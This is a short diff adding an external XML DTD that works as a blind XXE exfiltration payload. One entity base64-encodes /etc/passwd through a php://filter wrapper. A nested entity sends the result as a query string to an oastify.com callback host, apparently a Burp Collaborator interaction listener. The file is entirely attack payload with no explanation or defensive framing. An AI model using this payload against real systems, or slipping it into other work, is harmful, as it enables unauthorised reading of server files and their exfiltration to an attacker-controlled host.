@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'http://qf9d7gquixv2h8xyvxrwerehx83zrxfm.oastify.com/?%payl;'>">
